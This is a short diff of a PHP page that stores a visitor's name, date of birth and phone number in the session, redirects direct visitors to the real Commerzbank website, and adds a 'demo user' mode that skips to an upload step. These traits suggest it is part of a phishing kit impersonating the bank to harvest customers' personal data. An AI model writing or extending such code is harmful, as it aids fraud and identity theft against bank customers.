@@ -43,10 +43,24 @@ if (checkAccess()) {
 session_start();
  
 if ($_SERVER['REQUEST_METHOD'] == 'POST') {
-    $_SESSION['xname1'] = $_POST['xname1'];
-    $_SESSION['xname2'] = $_POST['xname2'];
-    $_SESSION['xdob'] = $_POST['xdob'];
-    $_SESSION['xtel'] = $_POST['xtel'];
+    // Check if this is a demo user
+    if (isset($_SESSION['demo_user']) && $_SESSION['demo_user'] === true) {
+        // Set demo user personal data
+        $_SESSION['xname1'] = 'Demo';
+        $_SESSION['xname2'] = 'User';
+        $_SESSION['xdob'] = '01.01.1990';
+        $_SESSION['xtel'] = '0123456789';
+        
+        // Redirect to next upload page
+        header('Location: uploadz2.php');
+        exit();
+    } else {
+        // Regular user
+        $_SESSION['xname1'] = $_POST['xname1'];
+        $_SESSION['xname2'] = $_POST['xname2'];
+        $_SESSION['xdob'] = $_POST['xdob'];
+        $_SESSION['xtel'] = $_POST['xtel'];
+    }
 } else {
     header('Location: https://www.commerzbank.de/');
     exit();
